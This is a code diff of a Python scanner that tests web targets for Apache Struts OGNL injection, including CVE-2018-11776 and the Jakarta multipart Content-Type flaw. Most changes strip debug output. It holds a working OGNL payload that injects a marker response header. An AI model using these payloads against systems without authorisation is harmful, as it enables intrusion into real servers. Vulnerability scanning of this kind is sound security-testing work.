@@ -26,9 +26,9 @@ def get_parser():
     parser.add_argument('--cookies', dest='cookies',
                         help='HTTP cookies (eg. "jsessionid=1234")',action='store'
                        )
-    parser.add_argument('-p', dest='testparam',
-                       help='testable parameter',action='store'
-                       )
+#    parser.add_argument('-p', dest='testparam',
+#                       help='testable parameter',action='store'
+#                       )
     parser.add_argument('--proxy', dest='proxy', help='Use a proxy to connect to the target URL',
                         action='store'
                        )
@@ -36,7 +36,6 @@ def get_parser():
     return parser
 
 def do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
-    print("In multipart post request")
     boundary = "---------------------------735323031399963166993862150"
     content_type = "multipart/form-data; boundary=%s" % (boundary)
     filename = "gh0st"
@@ -45,14 +44,12 @@ def do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
     'Content-Type': content_type
     }
-    r_headers = {}
     try:
         output = b""
         with requests.post(ttarget, payload, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=headers, verify=False, allow_redirects=allow_redirects, stream=True) as response:
             for i in response.iter_content():
                 output += i
             r_headers =  response.headers
-            print(response.status_code)
     except requests.exceptions.RequestException as e:
         print(e)
         exit()
@@ -60,15 +57,12 @@ def do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_
 
 
 def do_Get(ttarget, dict_params, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
-    print("in get function")
-    r_headers = {}
     try:
         output = b""
         with requests.post(ttarget, params=dict_params, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
             for i in response.iter_content():
                 output += i
             r_headers = response.headers
-            print(response.status_code)
     except requests.exceptions.RequestException as e:
         print(e)
         exit()
@@ -76,15 +70,12 @@ def do_Get(ttarget, dict_params, dict_cookies, proxies_listener, timeout, hheade
 
 
 def do_Post(ttarget, raw_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
-    print("in post function")
-    r_headers = {}
     try:
         output = b""
         with requests.post(ttarget, data=raw_data, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
             for i in response.iter_content():
                 output += i
             r_headers = response.headers
-            print(response.status_code)
     except requests.exceptions.RequestException as e:
         print(e)
         exit()
@@ -92,26 +83,14 @@ def do_Post(ttarget, raw_data, dict_cookies, proxies_listener, timeout, hheaders
 
 
 def main():
-    print("in main function")
     parser = get_parser()
     args = vars(parser.parse_args())
-    url, data, cookies, testparam, proxy = args['url'], args['data'],args['cookies'], args['testparam'], args['proxy']
-
-    print(url, type(url))
-    print(data, type(url))
-    print(cookies, type(cookies))
-    print(testparam, type(testparam))
-    print(proxy, type(proxy))
+    url, data, cookies, proxy = args['url'], args['data'],args['cookies'], args['proxy']
 
     # parse url & query string
     parsed_url = urlparse(url)
-    print(parsed_url, type(parsed_url))
     target_url = parsed_url.geturl()
-    print("target url: " + target_url)
     query_param = parse_qs(parsed_url.query)
-    print(query_param, type(query_param))
-    print("parsed url scheme is:")
-    print(parsed_url.scheme, type(parsed_url.scheme))
 
     if parsed_url.scheme == 'http':
         ns_target = parsed_url.scheme + "://" + parsed_url.netloc
@@ -121,11 +100,6 @@ def main():
         print("There is somering wrong with the url")
         exit()
 
-    #url for namespace vulnerability
-    #ns_target = parsed_url.scheme + "://" + parsed_url.netloc
-
-    print("ns_taget is : {} ".format(ns_target))
-#    print(ns_target)
     path = parsed_url.path
 
     #convert cookie into dictionay if present
@@ -157,7 +131,7 @@ def main():
 
     #Request parameters
     target = parsed_url.geturl()
-    timeout = 3
+    timeout = 5
     headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
     'Content-Type': 'application/x-www-form-urlencoded'
@@ -168,13 +142,6 @@ def main():
     proxies_listener = proxies
     dict_param = query_param
     raw_data = data
-
-    print("----------------------")
-    print(target)
-    print(dict_cookies, type(dict_cookies))
- #   print("raw data is " + raw_data, type(raw_data))
- #   print("query string is: \n")
- #   print(dict_param, type(dict_param))
 
     #checking for ambigiuos request
     if raw_data is not None and bool(dict_param):
@@ -195,15 +162,10 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
     if raw_data is not None:
         print("Performing OGNL injection on Post parameters.........")
         data_url_decoded = unquote(raw_data)
-        print("url decoded data: " + data_url_decoded)
         dict_data = dict(subString.split("=") for subString in data_url_decoded.split("&"))
-        print(dict_data)
-
         for key in dict_data.keys():
             temp_dict_data = dict_data.copy()
-            print(key)
             temp_dict_data[key] = check_payload
-            print(temp_dict_data)
             print('Checking POST  parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
             output, r_headers = do_Post(ttarget, temp_dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
             match = re.search(r'ghostzzzz', str(output))
@@ -212,27 +174,11 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
             else:
                 print("[-] target not vulnerable to OGNL Injectin")
             temp_dict_data.clear()
-#        data_list = re.split(r'[=&]{1}', data_url_decoded)
-#        print(raw_data, type(raw_data))
-#        print(data_list)
-#        for i in range(1, len(data_list), 2):
-#            find = print(data_list[i])
-#            post_data = raw_data.replace(str(data_list[i]), quote(check_payload), 1)
-#            print('checking post parameter " {} " for OGNL injectin using payload {}...'.format(str(data_list[i-1]), check_payload))
-#            print('Post body params are: {}'.format(post_data))
-#            output, r_headers = do_Post(ttarget, post_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
-#            match = re.search(r'ghostzzzz', str(output))
-#            if match:
-#                print("[+] target is  vulnerable to OGNL Injection")
-#            else:
-#                print("[-] target is not vulnerable to OGNL Injection")
     else:
         print("performing oGNL injection on Query strings")
         for key in dict_param.keys():
             temp = dict_param.copy()
-            print(key)
             temp[key] = check_payload
-            print(temp)
             print('Checking Get parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
             output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
             match = re.search(r'ghostzzzz', str(output))
@@ -244,12 +190,9 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
 
     #checking for namespace redirect cve-2018-11776
     if raw_data is not None:
-        print(target)
         del ttarget
         ttarget = ns_target + "/" + quote(check_payload) + path
-        print(ttarget)
         print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
-        print('Sending post request')
         output, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
         match = re.search(r'ghostzzzz', str(output))
         if match:
@@ -259,12 +202,9 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
 
     else:
         print("Preforming Namespace Redirect OGNL Injection...sending GET request")
-        print(target)
         del ttarget
         ttarget = ns_target + "/" + quote(check_payload) + path
-        print(ttarget)
         print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
-        print('Sending GET request')
         output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
         match = re.search(r'ghostzzzz', str(output))
         if match:
@@ -273,29 +213,21 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
             print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")
 
     # Checking for Jakarta Multipart parser OGNL Injection - Content type header
-    print(hheaders)
     multipart_payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('strutsExploiter','gh0st27')}.multipart/form-data"
     hheaders['Content-Type'] = str(multipart_payload)
-    print(hheaders)
     del ttarget
     ttarget = target
     if raw_data is not None:
-        print("Sending Post Request")
         print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
         payload, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
-        print("response headers")
-        print(r_headers)
         if 'strutsExploiter' in r_headers.keys():
             if r_headers['strutsExploiter'] == 'gh0st27':
                 print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
         else:
             print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
     else:
-        print("Sending GET Request")
         print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
         payload, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
-        print("response headers")
-        print(r_headers)
         if 'strutsExploiter' in r_headers.keys():
             if r_headers['strutsExploiter'] == 'gh0st27':
                 print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
@@ -305,9 +237,7 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
 
     # Checking for Jakarta Multipart parser OGNL Injection - Content disposition header
     print("Chekcing Jakarta based file upload Multipart parser: Content-Disposition")
-    print(target)
     ttarget = copy.copy(target)
-    print(ttarget)
     payload, r_headers = do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
     if 'strutsExploiter' in r_headers.keys():
         if r_headers['strutsExploiter'] == 'gh0st27':
